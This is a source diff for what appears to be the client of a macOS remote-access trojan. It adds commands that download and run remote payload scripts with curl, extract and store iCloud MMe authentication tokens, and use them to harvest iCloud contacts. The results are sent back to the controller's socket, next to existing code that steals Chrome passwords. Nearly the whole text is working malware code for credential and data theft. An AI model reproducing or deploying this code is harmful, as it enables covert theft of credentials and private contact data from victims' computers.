@@ -9,7 +9,7 @@ from threading import Timer
 import time
 import platform
 import base64
-import re
+import json
 
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
@@ -262,7 +262,7 @@ def start_server():
                 execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
                 output = execute_command("python {0}".format(payload_file), False)
 
-                if "ERROR getting" in output:
+                if "Error" in output:
                     if "clicked deny" in output:
                         server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
                     elif "entry not found":
@@ -270,17 +270,56 @@ def start_server():
                     else:
                         server_socket.sendall(MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
                 else:
-                    output_stripped = re.compile(r'\x1b[^m]*m').sub('', output)
-                    server_socket.sendall(output_stripped)
+                    server_socket.sendall(output)
 
                 execute_command("rm -rf {0}".format(payload_file))
+            elif command == "decrypt_mme":
+                payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/MMeDecrypt.py"
+                payload_file = "/tmp/MMeDecrypt.py"
+
+                execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+                output = execute_command("python {0}".format(payload_file), False)
+
+                if "Failed to get iCloud" in output:
+                    server_socket.sendall(MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
+                elif "Failed to find" in output:
+                    server_socket.sendall(MESSAGE_ATTENTION + "Failed to find MMeToken file.")
+                else:
+                    # Decrypted successfully, store tokens in tokens.json
+                    with open(get_program_folder(is_root()) + "/tokens.json", "w") as open_file:
+                        open_file.write(output)
+
+                    server_socket.sendall(MESSAGE_INFO + "Decrypted successfully.")
+
+                execute_command("rm -rf {0}".format(payload_file))
+            elif command == "get_icloud_contacts":
+                if not os.path.isfile(get_program_folder(is_root()) + "/tokens.json"):
+                    # The server should handle this message and then call "decrypt_mme".
+                    server_socket.sendall(MESSAGE_ATTENTION + "Failed to find tokens.json")
+                else:
+                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/icloud_contacts.py"
+                    payload_file = "/tmp/icloud_contacts.py"
+
+                    execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+
+                    with open(get_program_folder(is_root()) + "/tokens.json") as open_file:
+                        response = ""
+
+                        for key, value in json.load(open_file).items():
+                            dsid = value["dsPrsID"]
+                            token = value["mmeAuthToken"]
+
+                            output = execute_command("python {0} {1} {2}".format(payload_file, dsid, token), False)
+
+                            response += MESSAGE_INFO + "Contacts for \"{0}\":\n".format(key)
+                            response += output
+
+                        server_socket.sendall(response)
+
+                    execute_command("rm -rf {0}".format(payload_file))
             elif command == "kill_client":
                 server_socket.sendall("Farewell.")
-
-                if is_root():
-                    kill_client(True)
-                else:
-                    kill_client()
+                kill_client(is_root())
             elif command == "get_root":
                 get_root(server_socket)
             else:
